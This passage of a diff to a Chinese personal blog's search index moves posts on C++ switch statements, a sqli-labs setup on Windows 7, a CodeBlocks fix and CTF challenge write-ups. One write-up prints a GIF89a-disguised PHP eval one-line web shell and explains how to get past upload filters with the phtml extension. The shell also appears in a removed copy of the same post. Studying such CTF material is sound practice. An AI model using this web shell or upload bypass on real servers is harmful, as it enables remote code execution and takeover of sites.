class="string">&quot;\n&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、switch条件语句"><a href="#三、switch条件语句" class="headerlink" title="三、switch条件语句"></a>三、switch条件语句</h1><p>作用：执行多条件分支语句</p>
+<p>语法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(表达式)</span><br><span class="line">    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">1</span>:执行语句;<span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> 结果<span class="number">2</span>:执行语句;<span class="keyword">break</span>;  </span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:执行语句;<span class="keyword">break</span>;    </span><br><span class="line">      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;prefect&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;<span class="comment">//此处一定不要忘记break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;normal&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;bad&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>switch缺点：判断时只能是整型或者字符型，不可以是区间，而if可以</p>
+<p>switch有点：结构清晰，执行效率高</p>
 ]]></content>
       <tags>
         <tag>C++</tag>
@@ -2071,6 +2170,32 @@
       </tags>
   </entry>
   <entry>
+    <title>Win7搭建sqlilabs</title>
+    <url>/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/</url>
+    <content><![CDATA[<h1 id="下载sqli-labs"><a href="#下载sqli-labs" class="headerlink" title="下载sqli-labs"></a>下载sqli-labs</h1><p><a href="https://github.com/Audi-1/sqli-labs">点击此处下载</a>sqli-labs</p>
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102456244.png" alt="image-20220112102456244"></p>
+<p>下载后将该文件移入虚拟机，并解压到如下文件夹</p>
+<span id="more"></span>
+
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102537646.png" alt="image-20220112102537646"></p>
+<h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><p>进入如下位置</p>
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102702411.png" alt="image-20220112102702411"></p>
+<p>打开phpstudy并启用如下服务</p>
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102759449.png" alt="image-20220112102759449"></p>
+<p>然后访问sqli-labs的网址</p>
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102840119.png" alt="image-20220112102840119"></p>
+<p>安装完成后即可使用</p>
+<h1 id="物理机访问虚拟机的sqli-labs"><a href="#物理机访问虚拟机的sqli-labs" class="headerlink" title="物理机访问虚拟机的sqli-labs"></a>物理机访问虚拟机的sqli-labs</h1><p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103120644.png" alt="image-20220112103120644"></p>
+<p>然后用物理机访问IPv4地址中的sqli-labs文件夹</p>
+<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103219553.png" alt="image-20220112103219553"></p>
+<p>完成</p>
+<p><strong>最后提示：一定一定一定一定要打开phpstudy的相关服务</strong></p>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bugku-bp</title>
     <url>/2021/12/05/bugku-bp/</url>
     <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
@@ -2132,32 +2257,6 @@
 ]]></content>
       <tags>
         <tag>刷题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Win7搭建sqlilabs</title>
-    <url>/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/</url>
-    <content><![CDATA[<h1 id="下载sqli-labs"><a href="#下载sqli-labs" class="headerlink" title="下载sqli-labs"></a>下载sqli-labs</h1><p><a href="https://github.com/Audi-1/sqli-labs">点击此处下载</a>sqli-labs</p>
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102456244.png" alt="image-20220112102456244"></p>
-<p>下载后将该文件移入虚拟机，并解压到如下文件夹</p>
-<span id="more"></span>
-
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102537646.png" alt="image-20220112102537646"></p>
-<h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><p>进入如下位置</p>
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102702411.png" alt="image-20220112102702411"></p>
-<p>打开phpstudy并启用如下服务</p>
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102759449.png" alt="image-20220112102759449"></p>
-<p>然后访问sqli-labs的网址</p>
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102840119.png" alt="image-20220112102840119"></p>
-<p>安装完成后即可使用</p>
-<h1 id="物理机访问虚拟机的sqli-labs"><a href="#物理机访问虚拟机的sqli-labs" class="headerlink" title="物理机访问虚拟机的sqli-labs"></a>物理机访问虚拟机的sqli-labs</h1><p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103120644.png" alt="image-20220112103120644"></p>
-<p>然后用物理机访问IPv4地址中的sqli-labs文件夹</p>
-<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103219553.png" alt="image-20220112103219553"></p>
-<p>完成</p>
-<p><strong>最后提示：一定一定一定一定要打开phpstudy的相关服务</strong></p>
-]]></content>
-      <tags>
-        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -2864,30 +2963,6 @@
       </tags>
   </entry>
   <entry>
-    <title>“解决codeblocks无法运行c++程序&quot;</title>
-    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
-    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
-<span id="more"></span>
-
-<p>#法1</p>
-<p>查看compiler setting中的路径，如下图</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
-<p>修改MinGW的路径后，解决问题</p>
-<p>#法2（法1未解决）</p>
-<p>路径正常，修改路径后显示</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
-<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
-<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
-<p>将该压缩包解压后，解决问题</p>
-<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
-]]></content>
-      <tags>
-        <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlilabs第四关</title>
     <url>/2022/01/22/sqlilabs%E7%AC%AC%E5%9B%9B%E5%85%B3/</url>
     <content><![CDATA[<p>p判断闭合方式</p>
@@ -3015,6 +3090,30 @@
 ]]></content>
       <tags>
         <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>“解决codeblocks无法运行c++程序&quot;</title>
+    <url>/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/</url>
+    <content><![CDATA[<p>下载Codeblocks后，创建新程序后，发现点击运行后无法弹出控制台，如图</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120305308.png" alt="image-20211127120305308"></p>
+<span id="more"></span>
+
+<p>#法1</p>
+<p>查看compiler setting中的路径，如下图</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120458845.png" alt="image-20211127120458845"></p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120607794.png" alt="image-20211127120607794"></p>
+<p>修改MinGW的路径后，解决问题</p>
+<p>#法2（法1未解决）</p>
+<p>路径正常，修改路径后显示</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127120747653.png" alt="image-20211127120747653"></p>
+<p>即缺少GNU GCC Compiler，说白了就是MinGW文件不完整，尝试删除WinGW文件夹，然后重新下载</p>
+<p>下载地址：链接：<a href="https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag">https://pan.baidu.com/s/12OXmsCeZM2zIrK95WTs7Ag</a>    提取码：axen</p>
+<p>将该压缩包解压后，解决问题</p>
+<p><img src="/2021/11/27/%E2%80%9C%E8%A7%A3%E5%86%B3codeblocks%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8Cc-%E7%A8%8B%E5%BA%8F%E2%80%9D/image-20211127121331465.png" alt="image-20211127121331465"></p>
+]]></content>
+      <tags>
+        <tag>C++</tag>
       </tags>
   </entry>
   <entry>
@@ -3242,7 +3341,7 @@
 <h1 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h1><p>进去后发现可下载文件，我们下载后打开，发现没啥线索，既然是信息搜集，我们就要扫后台，扫描到.git文件，进去后，没有发现关键线索，但是发现了后台登录页面，但是不知道用户名和密码，实在没办法了，看大佬wp，发现我们要使用wireshark工具进行抓包，先开wireshark，然后再开exe文件，然后在包中尝试搜索User发现关键信息</p>
 <p><img src="/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/image-20220402180235715.png" alt="image-20220402180235715"></p>
 <p>这里的用户名和密码一看就是经过了base64加密。解密结果如下</p>
-<p>User：<a href="mailto:&#98;&#117;&#x67;&#107;&#x75;&#x6b;&#x75;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#x6d;">&#98;&#117;&#x67;&#107;&#x75;&#x6b;&#x75;&#64;&#x31;&#x36;&#x33;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>User：<a href="mailto:&#x62;&#x75;&#103;&#107;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#x33;&#x2e;&#x63;&#111;&#x6d;">&#x62;&#x75;&#103;&#107;&#117;&#x6b;&#117;&#64;&#49;&#x36;&#x33;&#x2e;&#x63;&#111;&#x6d;</a></p>
 <p>Pass：XSLROCPMNWWZQDZL</p>
 <p>登录显示密码错误，然后继续看wp</p>
 <p>知道邮箱可以用授权码登录，所以我们用第三方邮箱登录看看有什么关键信息</p>
@@ -3579,6 +3678,39 @@
       </tags>
   </entry>
   <entry>
+    <title>极客大挑战 2019Upload</title>
+    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
+    <content><![CDATA[<p>该题为上传木马题</p>
+<p>进入题目后，上传一句话木马</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
+<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
+<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
+<p>上传失败</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
+<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
+<p>上传后</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
+<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
+<p>链接成功</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
+<p>最后在根目录下得到flag</p>
+<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>极客大挑战 2019 EasySQL</title>
     <url>/2021/12/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/</url>
     <content><![CDATA[<p>打开题目如下</p>
@@ -3627,39 +3759,6 @@
 ]]></content>
       <tags>
         <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极客大挑战 2019Upload</title>
-    <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
-    <content><![CDATA[<p>该题为上传木马题</p>
-<p>进入题目后，上传一句话木马</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140512260.png" alt="image-20211202140512260"></p>
-<p>出现如下界面，说明木马不能含有”&lt;?”字符</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202140538654.png" alt="image-20211202140538654"></p>
-<p>因为现在不会写一句话木马，则上网搜不含“&lt;?”的木马</p>
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>新建php文档，将代码输入其中，并抓包，修改格式，上传。</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155449805.png" alt="image-20211202155449805"></p>
-<p>上传失败</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202155757260.png" alt="image-20211202155757260"></p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160253250.png" alt="image-20211202160253250"></p>
-<p>绕过后缀的有文件格式有php,php3,php4,php5,phtml，pht，但php，pht被ban了，php345也不行的都不行，则用phtml</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160420596.png" alt="image-20211202160420596"></p>
-<p>上传后</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202160637524.png" alt="image-20211202160637524"></p>
-<p>打开蚁剑连接后发生错误，猜测是中文名字的原因，换成英文名，猜测上传后的文件在upload</p>
-<p>链接成功</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161339014.png" alt="image-20211202161339014"></p>
-<p>最后在根目录下得到flag</p>
-<p><img src="/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/image-20211202161504689.png" alt="image-20211202161504689"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
